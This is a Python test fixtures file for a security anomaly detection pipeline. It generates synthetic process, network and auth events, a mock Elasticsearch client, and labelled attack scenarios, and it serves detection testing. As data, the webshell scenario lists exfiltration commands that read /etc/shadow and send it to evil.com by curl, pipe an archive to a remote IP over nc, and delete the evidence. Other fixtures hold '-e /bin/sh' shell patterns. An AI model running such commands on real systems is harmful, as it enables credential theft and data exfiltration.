"""
Shared test fixtures for the anomaly detection pipeline.

Provides synthetic DataFrames, mock Elasticsearch clients, and
attack scenario data generators for use across all test modules.
"""

from __future__ import annotations

from datetime import datetime, timezone, timedelta
from unittest.mock import MagicMock

import numpy as np
import pandas as pd
import pytest


@pytest.fixture
def synthetic_process_df() -> pd.DataFrame:
    """Generate a synthetic process events DataFrame.

    Includes columns matching Elastic ECS schema for process events.
    100 rows with a mix of normal and suspicious patterns.
    """
    n = 100
    rng = np.random.default_rng(42)
    base_ts = datetime(2026, 3, 1, 10, 0, 0, tzinfo=timezone.utc)

    normal_procs = ["sshd", "bash", "systemd", "cron", "rsyslogd", "node", "python3"]
    sus_procs = ["nc", "base64", "curl"]

    process_names = (
        rng.choice(normal_procs, size=n - 5).tolist()
        + rng.choice(sus_procs, size=5).tolist()
    )
    rng.shuffle(process_names)

    return pd.DataFrame({
        "@timestamp": [
            (base_ts + timedelta(minutes=int(i * 5))).isoformat()
            for i in range(n)
        ],
        "process.name": process_names,
        "process.pid": rng.integers(1000, 65000, size=n),
        "process.parent.pid": rng.integers(1, 1000, size=n),
        "process.parent.name": rng.choice(["systemd", "bash", "sshd"], size=n),
        "process.executable": [f"/usr/bin/{p}" for p in process_names],
        "process.command_line": [
            f"/usr/bin/{p} --normal-flag" if p in normal_procs
            else f"/tmp/{p} -e /bin/sh"
            for p in process_names
        ],
        "user.name": rng.choice(["root", "alice", "bob", "www-data"], size=n),
        "host.hostname": rng.choice(["web01", "db01", "app01"], size=n),
        "event.outcome": rng.choice(["success", "failure"], size=n, p=[0.9, 0.1]),
    })


@pytest.fixture
def synthetic_network_df() -> pd.DataFrame:
    """Generate a synthetic network events DataFrame.

    Includes columns matching Elastic ECS schema for network events.
    80 rows with normal traffic plus some C2-like patterns.
    """
    n = 80
    rng = np.random.default_rng(43)
    base_ts = datetime(2026, 3, 1, 10, 0, 0, tzinfo=timezone.utc)

    normal_ips = ["10.0.0.1", "10.0.0.2", "172.16.0.1", "192.168.1.1"]
    external_ips = ["8.8.8.8", "1.1.1.1", "13.107.42.14"]
    sus_ips = ["185.220.101.1", "45.33.32.156"]

    dst_ips = (
        rng.choice(normal_ips, size=n - 10).tolist()
        + rng.choice(external_ips, size=5).tolist()
        + rng.choice(sus_ips, size=5).tolist()
    )
    rng.shuffle(dst_ips)

    return pd.DataFrame({
        "@timestamp": [
            (base_ts + timedelta(minutes=int(i * 2))).isoformat()
            for i in range(n)
        ],
        "source.ip": rng.choice(["10.0.0.50", "10.0.0.51", "10.0.0.52"], size=n),
        "destination.ip": dst_ips,
        "destination.port": rng.choice([22, 80, 443, 8080, 4444], size=n),
        "destination.domain": [
            "google.com" if ip.startswith("8.") else
            "cloudflare.com" if ip.startswith("1.") else
            "" for ip in dst_ips
        ],
        "process.name": rng.choice(["curl", "wget", "sshd", "node", "python3"], size=n),
        "user.name": rng.choice(["root", "alice", "bob"], size=n),
        "host.hostname": rng.choice(["web01", "db01", "app01"], size=n),
        "network.bytes": rng.integers(100, 100000, size=n),
    })


@pytest.fixture
def synthetic_auth_df() -> pd.DataFrame:
    """Generate a synthetic auth events DataFrame for brute-force testing."""
    n = 60
    rng = np.random.default_rng(44)
    base_ts = datetime(2026, 3, 1, 3, 0, 0, tzinfo=timezone.utc)

    # Normal logins + brute-force burst
    outcomes = (
        ["success"] * 40
        + ["failure"] * 20  # Simulated brute-force burst
    )
    rng.shuffle(outcomes)

    return pd.DataFrame({
        "@timestamp": [
            (base_ts + timedelta(seconds=int(i * 10))).isoformat()
            for i in range(n)
        ],
        "user.name": (
            rng.choice(["alice", "bob", "charlie"], size=40).tolist()
            + ["unknown_attacker"] * 20
        ),
        "source.ip": (
            rng.choice(["10.0.0.50", "10.0.0.51"], size=40).tolist()
            + ["185.220.101.99"] * 20
        ),
        "event.outcome": outcomes,
        "process.name": ["sshd"] * n,
        "host.hostname": ["web01"] * n,
    })


@pytest.fixture
def mock_es() -> MagicMock:
    """Create a mock Elasticsearch client.

    Returns a MagicMock that simulates basic ES operations
    (search, index, bulk) without requiring a real cluster.
    """
    es = MagicMock()
    es.ping.return_value = True
    es.info.return_value = {"version": {"number": "8.12.0"}}
    es.search.return_value = {"hits": {"hits": [], "total": {"value": 0}}}
    es.index.return_value = {"result": "created", "_id": "test-id-1"}
    es.bulk.return_value = {"errors": False, "items": []}
    return es


@pytest.fixture
def attack_scenario_webshell() -> pd.DataFrame:
    """Webshell exfiltration scenario: www-data spawns unusual processes.

    ATT&CK: T1059 (Execution), T1048 (Exfiltration).
    """
    base_ts = datetime(2026, 3, 1, 14, 0, 0, tzinfo=timezone.utc)
    return pd.DataFrame({
        "@timestamp": [
            (base_ts + timedelta(minutes=i)).isoformat() for i in range(10)
        ],
        "process.name": ["php", "sh", "whoami", "id", "cat", "curl", "tar", "base64", "nc", "rm"],
        "process.parent.name": ["apache2"] * 10,
        "process.command_line": [
            "php /var/www/shell.php",
            "sh -c whoami",
            "whoami",
            "id",
            "cat /etc/passwd",
            "curl http://evil.com/exfil -d @/etc/shadow",
            "tar czf /tmp/data.tar.gz /home",
            "base64 /tmp/data.tar.gz",
            "nc 185.220.101.1 4444 < /tmp/data.tar.gz",
            "rm -f /tmp/data.tar.gz",
        ],
        "user.name": ["www-data"] * 10,
        "host.hostname": ["web01"] * 10,
        "process.pid": list(range(10001, 10011)),
        "process.parent.pid": [9999] * 10,
    })


@pytest.fixture
def attack_scenario_ssh_brute() -> pd.DataFrame:
    """SSH brute-force scenario: rapid auth failures from single IP.

    ATT&CK: T1110 (Brute Force).
    """
    base_ts = datetime(2026, 3, 1, 2, 0, 0, tzinfo=timezone.utc)
    return pd.DataFrame({
        "@timestamp": [
            (base_ts + timedelta(seconds=i * 2)).isoformat() for i in range(50)
        ],
        "user.name": [f"user{i % 5}" for i in range(50)],
        "source.ip": ["185.220.101.55"] * 50,
        "event.outcome": ["failure"] * 49 + ["success"],
        "process.name": ["sshd"] * 50,
        "host.hostname": ["web01"] * 50,
    })


@pytest.fixture
def attack_scenario_supply_chain_c2() -> pd.DataFrame:
    """Supply chain C2: compromised package beacons to C2 server.

    ATT&CK: T1071 (C2), T1195 (Supply Chain).
    """
    base_ts = datetime(2026, 3, 1, 8, 0, 0, tzinfo=timezone.utc)
    n = 24  # Hourly beacons over 24h
    return pd.DataFrame({
        "@timestamp": [
            (base_ts + timedelta(hours=i)).isoformat() for i in range(n)
        ],
        "process.name": ["python3"] * n,
        "process.command_line": ["python3 -m pip._vendor.requests"] * n,
        "source.ip": ["10.0.0.50"] * n,
        "destination.ip": ["45.33.32.156"] * n,
        "destination.port": [443] * n,
        "user.name": ["app-service"] * n,
        "host.hostname": ["app01"] * n,
        "network.bytes": [512 + i * 10 for i in range(n)],
    })
